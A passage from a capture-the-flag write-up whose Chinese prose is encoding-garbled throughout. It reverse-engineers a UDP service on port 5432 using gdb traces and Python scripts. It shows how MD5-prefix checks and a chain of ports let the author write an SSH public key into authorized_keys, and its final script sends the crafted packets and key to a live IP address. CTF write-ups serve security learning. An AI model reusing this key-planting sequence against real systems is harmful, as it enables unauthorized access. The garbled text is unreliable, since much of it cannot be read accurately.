inherit;">å®é™…ç«¯å£åº”è¯¥æ˜¯ä¸€ä¸ªã€‚</font><font style="vertical-align: inherit;">Netstatæ˜¾ç¤ºäº†å¼€æ”¾ç«¯å£5432ï¼ˆUDPï¼‰ã€‚</font></font><br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment"># netstat -ulnp Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name udp 0 0 0.0.0.0:5432 0.0.0.0:* 13611/./UwRJ8iaEEd4</span></span></code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> å°†åŒ…å«æ•°æ®çš„æ•°æ®åŒ…å‘é€åˆ°æŒ‡å®šçš„ç«¯å£ä¼šæ˜¾ç¤ºæœ‰å…³å…¶éªŒè¯çš„æ¶ˆæ¯ä»¥åŠæ¥è‡ªæœåŠ¡çš„ä¸€äº›æ•°æ®ï¼ˆ4å­—èŠ‚ï¼‰ï¼š </font></font><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#echo "test" &gt; /dev/udp/127.0.0.1/5432 # Verifying 74657374 009ec3b8</span></span></code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">é€šè¿‡å¯¹å„ç§æ•°æ®è¿›è¡Œæšä¸¾ï¼Œå¯ä»¥çœ‹å‡ºè¾“å‡ºå¯¹å…¶å†…å®¹çš„ä¾èµ–æ€§ã€‚</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">æ¥ä¸‹æ¥æ˜¯ä½¿ç”¨gdbè¿›è¡Œè°ƒè¯•ã€‚</font><font style="vertical-align: inherit;">é¦–å…ˆï¼Œæˆ‘æ‰¾å‡ºè¦ä»å“ªé‡Œè·å–æ•°æ®ï¼Œå³recvfromå’Œbacktraceçš„æ–­ç‚¹ã€‚</font><font style="vertical-align: inherit;">æˆ‘ä»¬æœ€åå¾—åˆ°åœ°å€0x6ae010ã€‚</font></font><br><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">è¿‡æ¸¡é“¾</font></font></b> <div class="spoiler_text"><pre> <code class="bash hljs">6ae00b: e8 d0 2b d5 ff call 400be0 &lt;recvfrom@plt&gt; 6ae010: e9 64 bc ea ff jmp 559c79 &lt;MD5_Update@@Base+0x953fc&gt; 559c79: 89 45 80 mov DWORD PTR [rbp-0x80],eax 559c7c: 83 f8 ff cmp eax,0xffffffff <span class="hljs-comment"><span class="hljs-comment">#   ,  -1 559c7f: 0f 84 62 7f 1c 00 je 721be7 &lt;MD5_Final@@Base+0x9e933&gt; 559c85: e9 8a d6 2c 00 jmp 827314 &lt;MD5_Final@@Base+0x1a4060&gt; 827314: 48 c7 c7 30 d1 f0 00 mov rdi,0xf0d130 82731b: 48 29 27 sub QWORD PTR [rdi],rsp 82731e: 48 89 df mov rdi,rbx 827321: e8 5f 94 fe ff call 810785 &lt;MD5_Final@@Base+0x18d4d1&gt; 827326: e9 d7 a5 2d 00 jmp b01902 &lt;MD5_Init@@Base+0x7569&gt; b01902: 85 c0 test eax,eax b01904: 0f 84 dd 02 c2 ff je 721be7 &lt;MD5_Final@@Base+0x9e933&gt; b0190a: e9 7c a9 bb ff jmp 6bc28b &lt;MD5_Final@@Base+0x38fd7&gt;</span></span></code> </pre> <br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">åœ¨é“¾ä¸­ï¼Œåœ¨0x810758å¤„è°ƒç”¨è¯¥å‡½æ•°å¹¶å¤„ç†å…¶ç»“æœã€‚</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">å°†breakè®¾ç½®ä¸º0xb01902ï¼Œå‘é€æ•°æ®åŒ…ã€‚</font></font><br><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">è¿”å›ç ï¼ˆraxå¯„å­˜å™¨ï¼‰</font></font></b> <div class="spoiler_text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ï¼ˆgdbï¼‰b * 0xb01902ï¼ˆgdbï¼‰å¤„çš„</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">æ–­ç‚¹2 </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">c </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ç»§ç»­ã€‚</font><font style="vertical-align: inherit;">åœ¨MD5_Initï¼ˆï¼‰</font><font style="vertical-align: inherit;">ï¼ˆgdbï¼‰info reg rax </font><font style="vertical-align: inherit;">rax 0x0 0ä¸­</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">éªŒè¯74657374 </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">00f82488 </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">æ–­ç‚¹2ã€0x0000000000b01902</font></font><br><font style="vertical-align: inherit;"></font><br><font style="vertical-align: inherit;"></font><br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ä»£ç 0è¡¨ç¤ºæ— æ•ˆæ•°æ®ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å‡è®¾å¯¹äºæ­£ç¡®çš„è§£å†³æ–¹æ¡ˆï¼Œæˆ‘ä»¬éœ€è¦è¿”å›çš„ä»£ç ä¸æ˜¯0ã€‚</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">åœ¨è¿›ä¸€æ­¥çš„ç ”ç©¶è¿‡ç¨‹ä¸­ï¼Œæˆ‘æµè§ˆäº†gdbï¼Œå®ƒ</font><font style="vertical-align: inherit;">åœ¨å‘é€æ•°æ®åŒ…ï¼ˆä¹Ÿå‘é€â€œæµ‹è¯•â€ï¼‰æ—¶</font><font style="vertical-align: inherit;">ä¼ é€’ç»™</font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MD5_Update</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">å‡½æ•°</font><font style="vertical-align: inherit;">ã€‚</font></font><br><br><div class="spoiler">  <b class="spoiler_title">ç»“æœ</b> <div class="spoiler_text"><pre> <code class="bash hljs">(gdb) b MD5_Update Breakpoint 3 at 0x4c487d (2 locations) (gdb) c Continuing. Verifying 74657374 Breakpoint 3, 0x00000000004c487d <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> MD5_Update () (gdb) info reg rsi rsi 0x7fffffffdd90 140737488346512 (gdb) x/20bx <span class="hljs-variable"><span class="hljs-variable">$rsi</span></span> 0x7fffffffdd90: 0x74 0x65 0x73 0x74 0x0a 0xff 0x7f 0x00 0x7fffffffdd98: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdda0: 0x00 0x00 0x00 0x00 (gdb) info reg <span class="hljs-variable"><span class="hljs-variable">$rdx</span></span> rdx 0x200 512</code> </pre> <br></div></div><br><h4> ç»“æœ </h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MD5æ˜¯ä»æˆ‘ä»¬å‘é€çš„æ¶ˆæ¯ä¸­è®¡ç®—å¾—å‡ºçš„ï¼Œä½†è¯»å–çš„æ•°æ®å¤§å°ä¸º512å­—èŠ‚ã€‚åœ¨å¤„ç†äº†æ•°æ®ä¹‹åï¼Œæˆ‘å‘ç°MD5æ˜¯ä»å‘é€çš„æ•°æ®ä¸­ç®—èµ·çš„ï¼Œé›¶å¡«å……äº†512ä¸ªå­—èŠ‚ã€‚ä½†æ˜¯æ‚¨éœ€è¦è‡³å°‘å‘é€8ä¸ªå­—èŠ‚æ‰èƒ½æ›¿æ¢å­˜å‚¨åœ¨å †æ ˆä¸­çš„8ä¸ªå­—èŠ‚ã€‚æ˜¾ç„¶ï¼Œä¸€äº›åœ°å€å­˜å‚¨åœ¨é‚£é‡Œã€‚æœåŠ¡ä¸ºæ¯ä¸ªä¼ å…¥æ•°æ®åŒ…æ˜¾ç¤ºçš„4ä¸ªå­—èŠ‚ä¸MD5å’Œçš„å‰3ä¸ªå­—èŠ‚ç›¸å¯¹åº”ï¼Œå¹¶é™„åŠ ä¸€ä¸ªé›¶ã€‚</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">æˆ‘è¿”å›åˆ°å‡½æ•°0x810758åŠå…¶è¿”å›ä»£ç 0ã€‚è¿”å›å€¼å­˜å‚¨åœ¨RAXå¯„å­˜å™¨ä¸­ã€‚ä¸ºäº†ç¡®å®šè¿”å›ç ï¼Œæˆ‘åœ¨å‡½æ•°0x810758çš„åœ°å€å’Œæ‰§è¡Œ0x827326ä¹‹åçš„åœ°å€å¤„è®¾ç½®äº†2ä¸ªæ–­ç‚¹ã€‚</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">æˆ‘å‘é€äº†æ•°æ®ï¼ŒæŒ‡å‘0x810758çš„ä½ç½®èµ·ä½œç”¨äº†ã€‚æˆ‘åœ¨gdbä¸­å¯åŠ¨äº†è„šæœ¬ï¼š</font></font><br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> gdb <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> open(<span class="hljs-string"><span class="hljs-string">"flow.log"</span></span>, <span class="hljs-string"><span class="hljs-string">"w"</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> fw: <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> <span class="hljs-number"><span class="hljs-number">1</span></span>: s = gdb.execute(<span class="hljs-string"><span class="hljs-string">"info reg rip"</span></span>, to_string=<span class="hljs-keyword"><span class="hljs-keyword">True</span></span>) s = s[s.find(<span class="hljs-string"><span class="hljs-string">"0x"</span></span>):] gdb.execute(<span class="hljs-string"><span class="hljs-string">"ni"</span></span>, to_string=<span class="hljs-keyword"><span class="hljs-keyword">True</span></span>) address = s.split(<span class="hljs-string"><span class="hljs-string">"\t"</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>].strip() fw.write(address + <span class="hljs-string"><span class="hljs-string">"\r\n"</span></span>) address = int(address, <span class="hljs-number"><span class="hljs-number">16</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> address == <span class="hljs-number"><span class="hljs-number">0x827326</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">break</span></span></code> </pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">æˆ‘å¾—åˆ°äº†æ–‡ä»¶</font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">flow.logï¼Œ</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">å…¶ä¸­åŒ…å«æ­£åœ¨æ‰§è¡Œçš„åŠŸèƒ½æ‰§è¡Œè¿‡ç¨‹ä¸­ä¼ é€’çš„æ‰€æœ‰åœ°å€ã€‚</font><font style="vertical-align: inherit;">å®é™…ä¸Šï¼Œè¿™å¹¶ä¸æ˜¯é‚£ä¹ˆç®€å•ï¼Œä½†æ˜¯æœ€åæˆ‘æ¥åˆ°äº†è¿™ä¸€ç‚¹ã€‚</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ä½¿ç”¨</font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">objdmpçš„</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">åæ±‡ç¼–ä»£ç </font><font style="vertical-align: inherit;">å‡†å¤‡äº†æ–‡ä»¶â€œ </font><b><font style="vertical-align: inherit;">disasm.log</font></b><font style="vertical-align: inherit;"> â€ï¼Œä»¥ä½¿å…¶æ˜“äºè¯»å–ï¼Œä¾‹å¦‚â€œ </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">addressï¼šinstruction</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> â€ï¼Œè€Œæ— éœ€å¤šä½™çš„è¡Œã€‚</font></font><br><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">æˆ‘å¯åŠ¨äº†è¿™æ ·çš„è„šæœ¬</font></font></b> <div class="spoiler_text"><pre> <code class="python hljs">F_NAME = <span class="hljs-string"><span class="hljs-string">"disasm.log"</span></span> F_FLOW = <span class="hljs-string"><span class="hljs-string">"flow.log"</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">prepare_code_flow</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(f_path)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> open(f_path, <span class="hljs-string"><span class="hljs-string">"rb"</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> fr: data = fr.readlines() data = filter(<span class="hljs-keyword"><span class="hljs-keyword">lambda</span></span> x: x, data) start_address = long(data[<span class="hljs-number"><span class="hljs-number">0</span></span>].split(<span class="hljs-string"><span class="hljs-string">":"</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>], <span class="hljs-number"><span class="hljs-number">16</span></span>) end_address = long(data[<span class="hljs-number"><span class="hljs-number">-1</span></span>].split(<span class="hljs-string"><span class="hljs-string">":"</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>], <span class="hljs-number"><span class="hljs-number">16</span></span>) res = [<span class="hljs-string"><span class="hljs-string">""</span></span>] * (end_address - start_address + <span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> _d <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> data: _d = _d.split(<span class="hljs-string"><span class="hljs-string">":"</span></span>) res[long(_d[<span class="hljs-number"><span class="hljs-number">0</span></span>].strip(), <span class="hljs-number"><span class="hljs-number">16</span></span>) - start_address] = <span class="hljs-string"><span class="hljs-string">""</span></span>.join(_d[<span class="hljs-number"><span class="hljs-number">1</span></span>:]).strip() <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> start_address, res <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">parse_instruction</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(code)</span></span></span><span class="hljs-function">:</span></span> mnem = code[:<span class="hljs-number"><span class="hljs-number">7</span></span>].strip() ops = code[<span class="hljs-number"><span class="hljs-number">7</span></span>:].split(<span class="hljs-string"><span class="hljs-string">","</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> [mnem] + ops <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">process_instruction</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(code)</span></span></span><span class="hljs-function">:</span></span> parse_data = parse_instruction(code) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> parse_data[<span class="hljs-number"><span class="hljs-number">1</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> [<span class="hljs-string"><span class="hljs-string">"rax"</span></span>, <span class="hljs-string"><span class="hljs-string">"eax"</span></span>, <span class="hljs-string"><span class="hljs-string">"al"</span></span>]: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">True</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">False</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> __name__ == <span class="hljs-string"><span class="hljs-string">'__main__'</span></span>: <span class="hljs-comment"><span class="hljs-comment"># Prepare disassemble data start_address, codes = prepare_code_flow(F_NAME) with open(F_FLOW, "rb") as fr: lines = fr.readlines() lines.reverse() lines = filter(lambda x: x, lines) count = 0 for _l in lines: offset = long(_l.strip(), 16) - start_address if process_instruction(codes[offset]): print str(count) + " " + hex(offset + start_address) + " " + codes[offset] break count += 1 continue</span></span></code> </pre> <br><br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> è„šæœ¬åªæ˜¯ç®€å•åœ°ä»æœ«å°¾â€œè¿”å›â€åœ°å€ï¼Œç›´åˆ°å®ƒåœ¨æŒ‡ä»¤çš„ç¬¬ä¸€ä¸ªæ“ä½œæ•°ä¸­æ¥æ”¶åˆ°RAXå¯„å­˜å™¨ä¸ºæ­¢ã€‚ </font></font>ç»“æœï¼š <br> <code>0x67c27c mov DWORD PTR [rbp-0x14], 0x0</code> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">è¿™æ˜¯é›¶å€¼ã€‚</font><font style="vertical-align: inherit;">æ¥ä¸‹æ¥ï¼Œåªéœ€é€€å›åˆ°ä»»ä½•åˆ†æ”¯ï¼ˆæ–‡ä»¶â€œ </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">flow.log</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> â€ï¼‰ï¼š</font></font><br><br><pre> <code class="plaintext hljs">95b6ad: jmp 73d0d1 &lt;MD5_Final@@Base+0xb9e1d&gt; 95b6b2: cmp DWORD PTR [rbp-0x2d4],0x133337 95b6bc: jne 67c270 &lt;MD5_Update@@Base+0x1b79f3&gt;</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">åœ°å€0x95b6b2æ˜¯æŸä¸ªå€¼ä¸0x133337çš„æ¯”è¾ƒã€‚</font><font style="vertical-align: inherit;">æ–­ç‚¹ï¼Œçœ‹[rbp-0x2d4]ã€‚</font><font style="vertical-align: inherit;">ä¸ºæ­¤ï¼Œè¯·å‘æ•°æ®åŒ…å‘é€æ•°æ®â€œ testtestâ€ï¼š</font></font><br><br><pre> <code class="plaintext hljs"># echo -n "testtest" &gt; md5.bin # truncate -s 512 md5.bin # md5sum md5.bin e9b9de230bdc85f3e929b0d2495d0323 md5.bin # echo -n "testtest" &gt; /dev/udp/127.0.0.1/5432 (gdb) b *0x95b6b2 Breakpoint 6 at 0x95b6b2 (gdb) c Continuing. Verifying 74657374 00deb9e9 Breakpoint 6, 0x000000000095b6b2 in MD5_Final () (gdb) x/20bx $rbp-0x2d4 0x7fffffffdd7c: 0xe9 0xb9 0xde 0x00 0xe9 0xb9 0xde 0x23 0x7fffffffdd84: 0x0b 0xdc 0x85 0xf3 0xe9 0x29 0xb0 0xd2 0x7fffffffdd8c: 0x49 0x5d 0x03 0x23</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">åŒ¹é…MD5å’Œçš„å‰3ä¸ªå­—èŠ‚ã€‚è§£å†³æ–¹æ¡ˆå½’ç»“ä¸ºä½¿ç”¨å‰3ä¸ªå­—èŠ‚â€œ \ x37 \ x33 \ x13â€æ¥è·å–MD5å’Œã€‚</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ä¸€ä¸ªç®€å•çš„è„šæœ¬ï¼Œå¯ä»¥ä½¿ç”¨äºŒè¿›åˆ¶å½¢å¼MD5å°†è®¡ç®—ä»é›¶å¼€å§‹è¿­ä»£åˆ°æ‰€éœ€çš„åŒ¹é…ã€‚å‘é€æ‰€éœ€çš„æ•°æ®å·²æ¥æ”¶ã€‚æˆ‘ä»¬å‘é€æ•°æ®å¹¶ä»æœåŠ¡æ¥æ”¶åˆ°æœ‰å…³æŒ‡å®šæ–°ç«¯å£ä»¥æ¥æ”¶æ•°æ®çš„æ¶ˆæ¯ï¼š</font></font><br><br><pre> <code class="plaintext hljs">New salt 508bd11b Next port 14235 Binding 14235 Waiting for data...3 14235 0</code> </pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Netstatæ²¡æœ‰æ˜¾ç¤ºæ­¤ç«¯å£ï¼Œä¹Ÿæ²¡æœ‰æ˜¾ç¤ºæ–°ç«¯å£ã€‚ä½†æ˜¯psæ˜¾ç¤ºå­˜åœ¨ç»ˆæ­¢çš„å­è¿›ç¨‹ï¼ˆåƒµå°¸ï¼‰ã€‚æƒ³æ³•æ˜¯ç«¯å£åœ¨å­è¿›ç¨‹ä¸­æ‰“å¼€äº†ä¸€æ®µæ—¶é—´ã€‚</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">æˆ‘å°†å¿…è¦çš„æ•°æ®åŒ…å‘é€åˆ°ç«¯å£5432ï¼Œç„¶åå‘é€åˆ°ç«¯å£14235ã€‚ä»€ä¹ˆä¹Ÿæ²¡æœ‰ã€‚ç«¯å£å·²åœæ­¢æ‰“å¼€ã€‚ç»“æœï¼Œæˆ‘ä»¥æ­£ç¡®çš„èµ·ç‚¹ç”Ÿæˆäº†å…¶ä»–æ•°æ®ï¼Œå¹¶å› æ­¤ç”Ÿæˆäº†MD5ã€‚å†æ¬¡å‘é€æ¶ˆæ¯ï¼Œä½†æ˜¯è¿™æ¬¡ä½¿ç”¨ä¸åŒçš„ç«¯å£ã€‚é‡æ–°å¯åŠ¨æœåŠ¡åï¼Œç¬¬ä¸€ä¸ªMD5å†æ¬¡ä¸ç«¯å£14235ä¸€èµ·å·¥ä½œã€‚æœ‰äººè®¤ä¸ºè¯¥æœåŠ¡ä¼šè®°ä½ç”¨å®Œçš„MD5ã€‚å› æ­¤ï¼Œæ¯æ¬¡é‡æ–°å¯åŠ¨æœåŠ¡æ—¶éƒ½è¿›è¡Œäº†æµ‹è¯•ã€‚</font></font><br><br><div class="spoiler">  <b class="spoiler_title">ç»“æœ</b> <div class="spoiler_text"><pre> <code class="plaintext hljs">Binding 22 Waiting for data...Verifying 1BFFFFFFD1FFFFFF8B50 00133337 New salt 508bd11b Next port 14235 Binding 14235 Waiting for data...Received packet from 127.0.0.1:43614 Data: 3 14235 27 Next port 23038 Binding 23038 Waiting for data...4</code> </pre> <br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">å†æ¬¡æ˜¯ä¸€ä¸ªæ–°ç«¯å£ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘å¼€å§‹è®¤ä¸ºæ¸¯å£é“¾å¯èƒ½ä¼šå¾ˆé•¿ã€‚</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">å®é™…ä¸Šï¼Œä¸‹ä¸€ä¸ªæ¸¯å£ï¼ˆ31841ï¼‰æ˜¯æœ€åä¸€ä¸ªã€‚ç»è¿‡ä¸€æ®µæ—¶é—´ä½¿ç”¨gdbä»¥åŠåæ±‡ç¼–çš„ä»£ç å’Œå„ç§æµ‹è¯•ä¹‹åï¼Œæˆ‘å‘ç°å‡ºç°äº†æ–‡ä»¶â€œ /home/task/.ssh/authorized_keysâ€ã€‚</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">è¿›ä¸€æ­¥å‘ç°æ–‡ä»¶å¤–è§‚çš„åŸå› å·²æˆä¸ºæ—¶é—´é—®é¢˜ï¼Œè¿™ä¹Ÿå°†å†™å…¥æ–‡ä»¶ä¸­ã€‚ç»“æœï¼Œåœ¨ç¬¬ä¸€ä¸ªåˆ°æœ€åä¸€ä¸ªæ‰“å¼€çš„ç«¯å£ä¹‹åå‘é€çš„æ•°æ®åŒ…æ•°æ®å°†è¢«å†™å…¥æ–‡ä»¶ï¼ˆå¦‚æœä¸æ¸…æ¥šï¼Œå°†åœ¨ä¸‹é¢çš„è„šæœ¬ä¸­çœ‹åˆ°ï¼‰ã€‚</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">è¿›ä¸€æ­¥ç”ŸæˆRSAå¯†é’¥å¹¶å‘é€ç»™å…¬ä¼—ã€‚</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ç„¶åé€šè¿‡SSHåœ¨æœåŠ¡å™¨ä¸Šè¿›è¡Œæˆæƒï¼Œæœç´¢å¹¶è·å–æ ‡å¿—ã€‚</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">åœ¨ç”³è¯·è¿‡ç¨‹ä¸­ï¼Œåªæœ‰ç¬¬ä¸‰ä¸ªç”Ÿæˆçš„MD5å’Œå¯¹æˆ‘æœ‰ç”¨ã€‚</font><font style="vertical-align: inherit;">å®Œæˆä»»åŠ¡åï¼Œæˆ‘ä»ç›¸åçš„ç»“æœä¸­å‘ç°ï¼Œå®é™…ä¸Šï¼Œç¬¬ä¸‰ç¬”é‡‘é¢å°†å§‹ç»ˆæœ‰æ•ˆï¼ˆæˆ–è€…æ›´ç¡®åˆ‡åœ°è¯´ï¼Œåœ¨æŸä¸ªè®¡æ•°å™¨åˆ°æœŸä¹‹å‰ï¼‰ã€‚</font><font style="vertical-align: inherit;">ä¸ºäº†ä½¿å’Œè¿ç»­è¿è¡Œï¼Œå¿…é¡»åœ¨æ•°æ®åŒ…æ•°æ®çš„å‰4ä¸ªå­—èŠ‚ï¼ˆä»ä¸­è€ƒè™‘MD5ï¼‰ä¸­ä¼ è¾“çš„intå‹æ•´æ•°ä¸ºè´Ÿï¼Œå³è®¾ç½®ç¬¬å››ä¸ªå­—èŠ‚çš„ç¬¬ä¸€ä½ï¼ˆåå‘å­—èŠ‚é¡ºåºï¼‰ã€‚</font></font><br><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ä»¥ä¸‹æ˜¯è§£å†³é—®é¢˜æ—¶ç”¨äºä¼ è¾“RSAå¯†é’¥çš„è„šæœ¬ã€‚</font></font></b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> socket <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> time <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> SocketServer <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> select d = [<span class="hljs-string"><span class="hljs-string">'\x1b\xd1\x8bP\x00\x00\x00\x00'</span></span>, <span class="hljs-string"><span class="hljs-string">'\x16\xbc\xf9 \x00\x00\x00\x00'</span></span>, <span class="hljs-string"><span class="hljs-string">'"\xa5I\x90\x00\x00\x00\x00\x00\x00'</span></span>] s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Send 1"</span></span> s.sendto(d[<span class="hljs-number"><span class="hljs-number">0</span></span>], (<span class="hljs-string"><span class="hljs-string">"95.216.185.52"</span></span>, <span class="hljs-number"><span class="hljs-number">5432</span></span>)) time.sleep(<span class="hljs-number"><span class="hljs-number">0.2</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Send 2"</span></span> s.sendto(d[<span class="hljs-number"><span class="hljs-number">1</span></span>], (<span class="hljs-string"><span class="hljs-string">"95.216.185.52"</span></span>, <span class="hljs-number"><span class="hljs-number">5432</span></span>)) time.sleep(<span class="hljs-number"><span class="hljs-number">0.2</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Send 3"</span></span> s.sendto(d[<span class="hljs-number"><span class="hljs-number">2</span></span>], (<span class="hljs-string"><span class="hljs-string">"95.216.185.52"</span></span>, <span class="hljs-number"><span class="hljs-number">5432</span></span>)) time.sleep(<span class="hljs-number"><span class="hljs-number">0.2</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Send 4"</span></span> s.sendto(<span class="hljs-string"><span class="hljs-string">"\x00"</span></span>, (<span class="hljs-string"><span class="hljs-string">"95.216.185.52"</span></span>, <span class="hljs-number"><span class="hljs-number">41357</span></span>)) time.sleep(<span class="hljs-number"><span class="hljs-number">0.2</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Send 5"</span></span> s.sendto(<span class="hljs-string"><span class="hljs-string">"\x04"</span></span>, (<span class="hljs-string"><span class="hljs-string">"95.216.185.52"</span></span>, <span class="hljs-number"><span class="hljs-number">42381</span></span>)) <span class="hljs-comment"><span class="hljs-comment"># for i in range(256): time.sleep(0.2) print "Send 6" s.sendto("\x02", ("95.216.185.52", 28709)) # Read key with open("ssh_key.txt", "rb") as fr: data = fr.read() print len(data) print "Send 7" s.sendto(data, ("95.216.185.52", 28709)) print s.recvfrom(1500) s.close()</span></span></code> </pre> <br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">æœç´¢çš„è¡Œï¼š</font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">æ ‡å¿—{a1ec3c43cae4250faa302c412c7cc524}</font></font></b> <br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">å¦‚æœæˆåŠŸï¼Œåˆ™å“åº”ä¸ºâ€œ OKâ€ã€‚</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">å®é™…ä¸Šï¼Œæ­£å¦‚æˆ‘æ‰€å†™çš„é‚£æ ·ï¼Œå‘é€ç¬¬ä¸€å’Œç¬¬äºŒä¸ªMD5æ€»å’Œæ˜¯å¤šä½™çš„ã€‚</font><font style="vertical-align: inherit;">æˆ‘è¿˜è®¤ä¸ºï¼Œä¸æ˜¯æ‰€æœ‰äº‹æƒ…éƒ½æ˜¯ç”±è¦æ±‚å†³å®šçš„ï¼Œè€Œæ˜¯è¢«é€‰æ‹©çš„ã€‚</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">æˆ‘è®¤ä¸ºæˆ‘ä¸ä¼šæ”¶åˆ°é‚€è¯·ï¼Œä»ä½œä¸šå¼€å§‹åˆ°å‘é€æ 